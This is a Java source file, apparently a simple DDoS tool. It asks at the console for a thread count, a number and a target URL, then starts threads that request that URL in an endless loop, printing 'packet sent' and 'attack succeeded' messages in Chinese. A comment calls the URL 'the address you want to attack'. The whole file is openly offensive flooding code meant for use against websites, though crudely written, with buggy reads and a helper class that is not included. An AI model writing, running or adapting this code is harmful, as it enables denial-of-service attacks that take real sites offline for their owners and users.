/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ddos;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.*;
import java.net.URLConnection;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.logging.Level;
import java.util.logging.Logger;

class Mythread implements Runnable {
    @Override
    public void run() {
        while (true) {
            try {
                URL url = new URL(DDOS.UacLim.url);
                /*
                    url里面是你要攻击的地址
                */
                URLConnection conn = url.openConnection();
                System.out.println("发包成功！");
                BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
                byte[] bytes = new byte[1024];
                int len = -1;
                StringBuilder sb = new StringBuilder();
                if (bis != null) {
                    if ((len = bis.read()) != -1) {
                        sb.append(new String(bytes, 0, len));
                        System.out.println("攻击成功！");
                        bis.close();
                    }
                    }
            }catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException ex) {
                Logger.getLogger(Mythread.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }
}

public class DDOS {
    static Scanner cin = new Scanner(System.in);
    static DDOSargs UacLim = new DDOSargs();
    private static String target;
    public static void work() {
        System.out.println("Input Threadnumber:");
        UacLim.threadLimit = cin.nextInt();
        System.out.println("Input timenumber(ms):");
        UacLim.timeLimit = cin.nextInt();
        System.out.println("Input url:");
        UacLim.url = cin.next();

        target = UacLim.url;

        ExecutorService es = Executors.newFixedThreadPool(UacLim.timeLimit);
        Mythread mythread = new Mythread();
        Thread thread = new Thread(mythread);
        for (int i = 0; i < UacLim.threadLimit; i++) {
            es.execute(thread);
        }
    }
}
     
   
